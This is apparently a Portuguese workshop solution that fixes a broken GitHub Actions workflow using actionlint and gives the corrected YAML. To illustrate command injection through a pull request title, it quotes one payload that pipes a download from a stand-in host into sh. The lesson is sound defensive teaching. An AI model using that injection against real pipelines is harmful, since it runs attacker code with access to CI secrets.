# Pipeline quebrado: uma solução possível

Na pasta `loja-ci` da oficina:

```
docker run --rm -v "${PWD}:/repo" -w /repo rhysd/actionlint:1.7.12 -color .github/workflows/ci.yml
```

(No PowerShell, `${PWD}` também funciona.)

## O que o actionlint aponta

- `unexpected key "branch" for "push" section`: o certo é `branches`.
- `label "ubuntu-lastest" is unknown`: erro de digitação em `ubuntu-latest`.
- `the runner of "actions/checkout@v2" action is too old`: a v2 roda num Node que o
  GitHub já desligou. Use a versão atual (`@v7`).
- `"github.event.pull_request.title" is potentially untrusted`: **injeção de comando.** O
  título do PR é escrito por quem abre o PR. Um título como
  `"; curl http://malicioso | sh; echo "` vira código dentro do `run`, com acesso aos
  segredos do job. Passe por variável de ambiente, que o shell trata como dado.
- `job "imagem" needs job "teste" which does not exist`: o job se chama `testes`.
- `property "metadata" is not defined`: o passo tem `id: meta`.

## O que só você pega

- Sem `if:`, a imagem seria publicada também em pull request, inclusive de forks.
- Para publicar no GHCR com o `GITHUB_TOKEN`, o job precisa de `packages: write`.
  Declare `permissions` no topo com o mínimo (`contents: read`) e amplie só no job
  que publica.

## O workflow consertado

```yaml
name: CI da loja

on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read

jobs:
  testes:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-python@v7
        with:
          python-version: "3.14"
      - name: Avisa o que está sendo testado
        env:
          TITULO: ${{ github.event.pull_request.title }}
        run: echo "Testando o PR $TITULO"
      - name: Testes
        run: python -m unittest discover -s app -v

  imagem:
    runs-on: ubuntu-latest
    needs: testes
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    permissions:
      contents: read
      packages: write
    steps:
      - uses: actions/checkout@v7
      - uses: docker/login-action@v4
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - name: Define a tag
        id: meta
        run: echo "tag=ghcr.io/${GITHUB_REPOSITORY,,}:${GITHUB_SHA}" >> "$GITHUB_OUTPUT"
      - uses: docker/build-push-action@v7
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tag }}
```

Detalhe: o nome da imagem no GHCR precisa estar em minúsculas; `${GITHUB_REPOSITORY,,}`
converte no próprio bash.
